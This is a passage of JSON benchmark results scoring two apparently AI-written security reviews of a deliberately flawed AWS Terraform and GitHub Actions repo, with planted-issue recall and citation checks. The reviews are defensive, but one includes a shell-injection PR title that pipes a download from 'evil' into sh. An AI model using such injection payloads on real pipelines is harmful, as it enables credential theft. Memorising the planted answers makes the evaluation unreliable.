+          "fixture": "aws-infra",
+          "variant": "old",
+          "rep": 2,
+          "systemBytes": 1995,
+          "status": "ok",
+          "wallMs": 30496,
+          "report": "**Verdict: Do not ship.** The pipeline lets an outside contributor run code with your AWS credentials. Several resources are also public or unprotected.\n\nI read all 9 files, which is the whole repo. I did not run `terraform validate` or `terraform plan`, so none of this is confirmed against a plan. I did not run the security-review or code-review skills, because the tree is clean and there is no diff to review.\n\n## Critical\n1. **Untrusted code runs with AWS keys** (`.github/workflows/deploy.yml:4,13-15,22-29`). The `pull_request_target` trigger gives the workflow secrets, and it checks out the PR's head SHA. A malicious PR can change the `.tf` files and run arbitrary code during `terraform plan`, for example through an `external` data source or a `local-exec`. That exposes `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `DB_PASSWORD`. Use `pull_request` for plan, and keep apply on `push` to main only.\n2. **Instance role grants everything** (`iam.tf:23-29`). `Action \"*\"` on `Resource \"*\"` means any compromise of an app instance is a compromise of the whole account. Scope it to the specific S3 prefix and secrets the app needs.\n3. **Database is public, unbacked-up and single-AZ** (`rds.tf:3,18-21`). `publicly_accessible = true` and the subnet group uses the public subnets. `backup_retention_period = 0` and `skip_final_snapshot = true` mean a delete loses all data. `multi_az = false` is a single point of failure. There is also no `storage_encrypted`, no `deletion_protection`, and no `lifecycle { prevent_destroy }`.\n4. **Customer uploads bucket is public** (`s3.tf:5-8`). The ACL is `public-read`, and there is no `aws_s3_bucket_public_access_block`, no server-side encryption config, and no access logging. Make it private and serve through CloudFront with origin access control (OAC) if needed.\n5. **SSH open to the internet** (`network.tf:28-34`). Port 22 allows `0.0.0.0/0`. Remove it and use SSM Session Manager.\n\n## High\n- **Unpinned actions** (`deploy.yml:13,17`): `actions/checkout@main` and `hashicorp/setup-terraform@main`. Pin both to commit SHAs. Also pin the Terraform version.\n- **Auto-apply with no review gate** (`deploy.yml:37`): `apply -auto-approve` runs on every push to main, with no GitHub Environment approval. Add a protected environment with required reviewers.\n- **Long-lived AWS keys** (`deploy.yml:24-25,34-35`): switch to GitHub OIDC with `aws-actions/configure-aws-credentials` and a least-privilege role. The workflow also has no `permissions:` block, so set it to `contents: read`.\n- **Script injection** (`deploy.yml:20`): `${{ github.event.pull_request.title }}` is interpolated directly into the shell. Pass it through `env:` instead, or drop the step.\n- **No remote state** (`versions.tf`): there is no backend, so state is lost between CI runs. The `plan` file and the `apply` run rely on the same runner, and any later run starts from empty state and tries to recreate everything. Use S3 with a lock and encryption.\n- **Providers and module unpinned** (`versions.tf:3-8`, `network.tf:2`): no version constraints on `aws` or `random`, and the VPC module has no `version`. There is also no committed `.terraform.lock.hcl`. `random` is declared but never used.\n- **Load balancer missing**: the app security group says \"from the load balancer\" (`network.tf:21`). There is no ALB or target group in the repo, and the ASG has no `target_group_arns` or `health_check_type = \"ELB\"`. Either it lives elsewhere or the app is unreachable and unhealthy instances are never replaced.\n\n## Medium\n- **No database encryption or password handling** (`rds.tf`): `password` is passed as a variable and ends up in state. Use `manage_master_user_password = true`. Also set `auto_minor_version_upgrade`, `performance_insights_enabled`, and CloudWatch log exports.\n- **ASG** (`main.tf:26-36`): no `desired_capacity`, no `instance_refresh`, no scaling policies, and the launch template uses `$Latest`. Add an instance refresh for rolling deploys. The AMI uses `most_recent`, so every plan can trigger replacement. Pin the AMI or manage it deliberately.\n- **Launch template** (`main.tf:21-23`): IMDSv2 is enforced, which is good. Add `http_put_response_hop_limit = 1`, EBS encryption, and detailed monitoring.\n- **Database security group** (`network.tf:44-55`): there are no egress rules. That is acceptable, but it is worth stating on purpose.\n- **Logging and audit**: no VPC flow logs, CloudTrail or S3 access logs anywhere in the repo.\n- **S3 versioning plus lifecycle** (`s3.tf:18-29`): there is no `abort_incomplete_multipart_upload`, and no expiry of delete markers.\n\n## Low\n- **Single NAT gateway** (`network.tf:12`): this is a cost saving, but it is a single-AZ dependency for the private subnets. That is acceptable for non-production.\n- **No tags**: there are no `default_tags` on the provider, which makes cost attribution hard.\n- **No `terraform fmt`, `validate` or tflint/checkov gates** in the pipeline.\n- **`t3.small` and `db.t3.medium`**: right-sizing cannot be judged without load data.\n\n## What is good\nIMDSv2 is required, the app security group allows the database port only from the app group, and the instances sit in private subnets across two AZs.\n\nFix items 1 to 5 first. Items 1 and 2 matter most, because together they let anyone who can open a PR reach an account-wide admin credential.",
+          "tools": 11,
+          "toolNames": {
+            "Glob": 1,
+            "Bash": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 20242,
+            "cache_read_input_tokens": 45916,
+            "output_tokens": 3257,
+            "output_tokens_details": {
+              "thinking_tokens": 68
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 20242,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 2069,
+                "cache_read_input_tokens": 20688,
+                "cache_creation_input_tokens": 4482,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 4482
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 7,
+            "criticalHighFound": 7,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "iam-wildcard",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "2. **Instance role grants everything** (`iam.tf:23-29`). `Action \"*\"` on `Resource \"*\"` means any compromise of an app instance is a compromise of the whole acc"
+              },
+              {
+                "id": "s3-public-unencrypted",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "4. **Customer uploads bucket is public** (`s3.tf:5-8`). The ACL is `public-read`, and there is no `aws_s3_bucket_public_access_block`, no server-side encryption"
+              },
+              {
+                "id": "ssh-open-to-world",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "5. **SSH open to the internet** (`network.tf:28-34`). Port 22 allows `0.0.0.0/0`. Remove it and use SSM Session Manager."
+              },
+              {
+                "id": "rds-public-no-backups",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "3. **Database is public, unbacked-up and single-AZ** (`rds.tf:3,18-21`). `publicly_accessible = true` and the subnet group uses the public subnets. `backup_rete"
+              },
+              {
+                "id": "unpinned-versions",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **Providers and module unpinned** (`versions.tf:3-8`, `network.tf:2`): no version constraints on `aws` or `random`, and the VPC module has no `version`. There"
+              },
+              {
+                "id": "static-aws-keys",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **Long-lived AWS keys** (`deploy.yml:24-25,34-35`): switch to GitHub OIDC with `aws-actions/configure-aws-credentials` and a least-privilege role. The workflo"
+              },
+              {
+                "id": "pull-request-target-head",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "1. **Untrusted code runs with AWS keys** (`.github/workflows/deploy.yml:4,13-15,22-29`). The `pull_request_target` trigger gives the workflow secrets, and it ch"
+              },
+              {
+                "id": "title-injection-in-run",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **Script injection** (`deploy.yml:20`): `${{ github.event.pull_request.title }}` is interpolated directly into the shell. Pass it through `env:` instead, or d"
+              },
+              {
+                "id": "actions-pinned-to-branch",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **Unpinned actions** (`deploy.yml:13,17`): `actions/checkout@main` and `hashicorp/setup-terraform@main`. Pin both to commit SHAs. Also pin the Terraform versi"
+              }
+            ],
+            "citations": {
+              "total": 17,
+              "valid": 17,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 7,
+              "ok": 7,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 4,
+              "over": 5,
+              "under": 0
+            },
+            "extraFindings": 13,
+            "extraTitles": [
+              "- **Auto-apply with no review gate** (`deploy.yml:37`): `apply -auto-approve` runs on every push to main, with no GitHub Environment approval. Add a protected e",
+              "- **No remote state** (`versions.tf`): there is no backend, so state is lost between CI runs. The `plan` file and the `apply` run rely on the same runner, and a",
+              "- **Load balancer missing**: the app security group says \"from the load balancer\" (`network.tf:21`). There is no ALB or target group in the repo, and the ASG ha",
+              "- **No database encryption or password handling** (`rds.tf`): `password` is passed as a variable and ends up in state. Use `manage_master_user_password = true`.",
+              "- **ASG** (`main.tf:26-36`): no `desired_capacity`, no `instance_refresh`, no scaling policies, and the launch template uses `$Latest`. Add an instance refresh ",
+              "- **Launch template** (`main.tf:21-23`): IMDSv2 is enforced, which is good. Add `http_put_response_hop_limit = 1`, EBS encryption, and detailed monitoring.",
+              "- **Database security group** (`network.tf:44-55`): there are no egress rules. That is acceptable, but it is worth stating on purpose.",
+              "- **Logging and audit**: no VPC flow logs, CloudTrail or S3 access logs anywhere in the repo.",
+              "- **S3 versioning plus lifecycle** (`s3.tf:18-29`): there is no `abort_incomplete_multipart_upload`, and no expiry of delete markers.",
+              "- **Single NAT gateway** (`network.tf:12`): this is a cost saving, but it is a single-AZ dependency for the private subnets. That is acceptable for non-producti",
+              "- **No tags**: there are no `default_tags` on the provider, which makes cost attribution hard.",
+              "- **No `terraform fmt`, `validate` or tflint/checkov gates** in the pipeline.",
+              "- **`t3.small` and `db.t3.medium`**: right-sizing cannot be judged without load data."
+            ],
+            "infoFindings": 0,
+            "blocks": 22,
+            "format": {
+              "verdictFirstLine": false,
+              "rubricLabels": true,
+              "notChecked": false,
+              "compliant": false
+            }
+          },
+          "firstPass": {
+            "found": 0,
+            "planted": 9,
+            "blocks": 0,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "raws",
+          "fixture": "aws-infra",
+          "variant": "new",
+          "rep": 2,
+          "systemBytes": 13418,
+          "status": "ok",
+          "wallMs": 36647,
+          "report": "VERDICT: block\n\nSummary: The deploy workflow lets untrusted pull-request code run with AWS credentials. It checks out PR code under `pull_request_target`, which gives the PR author those secrets. The Terraform also declares a public customer-uploads bucket, a public unbacked-up database, and a full-admin instance role.\n\n[Critical] Fork PR code runs with AWS keys and DB password — .github/workflows/deploy.yml:4,15,24\nEvidence: `pull_request_target:` … `ref: ${{ github.event.pull_request.head.sha || github.sha }}` … `AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}`\nWhy it matters: `pull_request_target` runs with the base repo's secrets. It then checks out and runs the PR's Terraform, and `terraform plan` executes `external` data sources, provider config and local-exec. Anyone who can open a PR can steal the AWS keys or run arbitrary AWS actions. The role behind those keys is unknown.\nFix: Use `pull_request` (no secrets) for plan, or plan only from a trusted checkout. Apply only on `push` to main. Replace static keys with OIDC (`permissions: id-token: write` plus `aws-actions/configure-aws-credentials` with `role-to-assume`). Use a read-only role for PR plans.\n\n[Critical] Customer uploads bucket is public-read — s3.tf:5-8\nEvidence: `acl = \"public-read\"` on `aws_s3_bucket_acl.uploads`. There is no `aws_s3_bucket_public_access_block` or `aws_s3_bucket_server_side_encryption_configuration` in the repo.\nWhy it matters: Anyone on the internet can list and read the \"customer-uploads\" bucket. Separately, new buckets disable ACLs by default, so this apply may fail unless ownership controls are set elsewhere. Either way the intent is public exposure.\nFix: Remove the ACL. Add `aws_s3_bucket_public_access_block` with all four flags true, SSE-KMS or AES256 encryption, and a TLS-only bucket policy.\n\n[High] RDS is public, unencrypted, and has no backups — rds.tf:3,18-21\nEvidence: `publicly_accessible = true`, `backup_retention_period = 0`, `skip_final_snapshot = true`. The subnet group uses `module.vpc.public_subnets`.\nWhy it matters: The \"orders\" database sits in public subnets with a public IP. The security group only admits the app SG, which limits reachability, but a later SG change would expose it directly. There are no backups, no final snapshot, and no `storage_encrypted` or `deletion_protection`. A bad apply or a replacement destroys all the data.\nFix: Use `module.vpc.private_subnets` (or `database_subnets`). Set `publicly_accessible = false`, `storage_encrypted = true`, `backup_retention_period = 7`, `deletion_protection = true`, `skip_final_snapshot = false` with a `final_snapshot_identifier`, and `multi_az = true`. Add `lifecycle { prevent_destroy = true }`.\n\n[High] App instance role is full admin — iam.tf:26-27\nEvidence: `Action = \"*\"`, `Resource = \"*\"` in `aws_iam_role_policy.app`\nWhy it matters: Any compromise of an app instance, for example through the SSH exposure below, gives full control of the account.\nFix: Scope to the needed actions and ARNs, for example `s3:GetObject` and `s3:PutObject` on `${aws_s3_bucket.uploads.arn}/*`, plus the specific secrets or SSM parameters it reads.\n\n[High] SSH open to the world on app servers — network.tf:28-34\nEvidence: `from_port = 22 … cidr_blocks = [\"0.0.0.0/0\"]`\nWhy it matters: SSH is open to the internet, although the instances are in private subnets, which limits actual reachability. Combined with the admin role, this is a risky path if the instances are ever made public.\nFix: Remove the rule and use SSM Session Manager, or restrict it to a bastion SG or VPN CIDR.\n\n[Medium] Script injection and unpinned actions in the workflow — deploy.yml:13,17,20\nEvidence: `run: echo \"Deploying ${{ github.event.pull_request.title }}\"`; `actions/checkout@main`; `hashicorp/setup-terraform@main`\nWhy it matters: A PR title such as `\"; curl evil|sh #` runs shell code in a job that holds secrets. Branch-pinned actions can change under you.\nFix: Pass the title via `env:` and quote it, or delete the step. Pin actions to full commit SHAs. Add a top-level `permissions: contents: read`.\n\n[Medium] Deploy has no approval gate and no remote state — deploy.yml:31-37, versions.tf\nEvidence: `terraform apply -auto-approve tfplan`. There is no `backend` block, no `environment:`, and no `concurrency:`.\nWhy it matters: Without a backend, state is local to the runner. Each run starts empty, so `terraform apply` tries to recreate everything and will conflict with what already exists. Even with state, pushes to main apply unreviewed, with no locking.\nFix: Add an S3 backend with encryption, versioning and `use_lockfile` (or a DynamoDB lock table). Add a protected `environment:` for the apply job and a `concurrency:` group. Run `plan` and `apply` as separate jobs.\n\n[Medium] Unpinned providers, module and AMI; unused `random` provider — versions.tf:3-8, network.tf:2, main.tf:1-9\nEvidence: `source = \"hashicorp/aws\"` with no `version`; `source = \"terraform-aws-modules/vpc/aws\"` with no `version`; `most_recent = true` on the AMI data source.\nWhy it matters: A future provider or module major version can change the plan unexpectedly. A newer AMI also forces the launch template (`$Latest`) to roll the instances on the next apply.\nFix: Add `required_version` and `version = \"~> 5.x\"` constraints. Commit `.terraform.lock.hcl`. Pin the module version. Pin the AMI or use an SSM parameter. Remove `random` if it's unused.\n\n[Low] Hygiene and reliability gaps\n- main.tf: The ASG has no `health_check_type = \"ELB\"`, no load balancer or target group, and no instance `tags`. The app SG says \"HTTPS from the load balancer\", but no ALB is defined here.\n- network.tf: The VPC module has no flow logs. `single_nat_gateway` is an acceptable cost trade-off but is a single point of failure.\n- s3.tf: The lifecycle rule has no `filter {}` block, which newer AWS provider versions warn about or reject. There is no abort-incomplete-multipart rule.\n- Repo-wide: No CloudTrail, no CloudWatch alarms, and no default tags.\n- main.tf: The launch template's `metadata_options` correctly sets IMDSv2 (`http_tokens = \"required\"`).\n\n## What I checked\nAll 9 tracked files: `deploy.yml`, `iam.tf`, `main.tf`, `network.tf`, `rds.tf`, `s3.tf`, `variables.tf`, `versions.tf`, `outputs.tf`.\n\n## What I did not check\n- Deployed state, the actual permissions of the AWS keys in the secrets, and GitHub branch protection and environment settings. I only have files, no account or repo access.\n- Whether `.terraform.lock.hcl` exists. It is not tracked.\n- Any organisation-level SCPs or S3 account-level public access block.\n- Whether `random` is used anywhere. I found no use in the 9 files.\n\n## Questions for the owner\n- Is the uploads bucket meant to be public? Even if so, serving it through CloudFront with OAC would be safer than `public-read`.\n- Where is the Terraform state kept today? If it's applied from elsewhere, that changes the remote-state finding.",
+          "tools": 10,
+          "toolNames": {
+            "Bash": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 24216,
+            "cache_read_input_tokens": 54112,
+            "output_tokens": 3811,
+            "output_tokens_details": {
+              "thinking_tokens": 0
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 24216,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 2760,
+                "cache_read_input_tokens": 24662,
+                "cache_creation_input_tokens": 4482,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 4482
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 7,
+            "criticalHighFound": 7,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "iam-wildcard",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] App instance role is full admin — iam.tf:26-27"
+              },
+              {
+                "id": "s3-public-unencrypted",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Customer uploads bucket is public-read — s3.tf:5-8"
+              },
+              {
+                "id": "ssh-open-to-world",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] SSH open to the world on app servers — network.tf:28-34"
+              },
+              {
+                "id": "rds-public-no-backups",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] RDS is public, unencrypted, and has no backups — rds.tf:3,18-21"
+              },
+              {
+                "id": "unpinned-versions",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Unpinned providers, module and AMI; unused `random` provider — versions.tf:3-8, network.tf:2, main.tf:1-9"
+              },
+              {
+                "id": "static-aws-keys",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Fork PR code runs with AWS keys and DB password — .github/workflows/deploy.yml:4,15,24"
+              },
+              {
+                "id": "pull-request-target-head",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Fork PR code runs with AWS keys and DB password — .github/workflows/deploy.yml:4,15,24"
+              },
+              {
+                "id": "title-injection-in-run",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Script injection and unpinned actions in the workflow — deploy.yml:13,17,20"
+              },
+              {
+                "id": "actions-pinned-to-branch",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Script injection and unpinned actions in the workflow — deploy.yml:13,17,20"
+              }
+            ],
+            "citations": {
+              "total": 10,
+              "valid": 10,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 7,
+              "ok": 6,
+              "sanity": 0.8571428571428571
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 4,
+              "over": 3,
+              "under": 2
+            },
+            "extraFindings": 0,
+            "extraTitles": [],
+            "infoFindings": 0,
+            "blocks": 9,
+            "format": {
+              "verdictFirstLine": true,
+              "rubricLabels": true,
+              "notChecked": true,
+              "compliant": true
+            }
+          },
+          "firstPass": {
+            "found": 9,
+            "planted": 9,
+            "blocks": 9,
+            "scorer": 1
+          }
+        }
+      ],
+      "rescored": "2026-10-17T13:27:59.444Z"
+    }
+  ]
+}
